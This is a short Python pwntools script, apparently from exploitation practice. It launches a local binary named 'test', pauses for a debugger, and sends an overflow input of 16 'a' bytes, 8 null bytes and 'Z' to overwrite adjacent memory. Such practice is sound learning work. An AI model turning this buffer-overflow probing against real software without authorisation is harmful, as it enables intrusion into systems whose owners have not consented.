from pwn import *

context.update(log_level='debug')
p = process('./test')
raw_input('debug: ' + str(p.pid))
p.sendline('a'*0x10 + '\x00'*8 +'Z')
p.interactive()

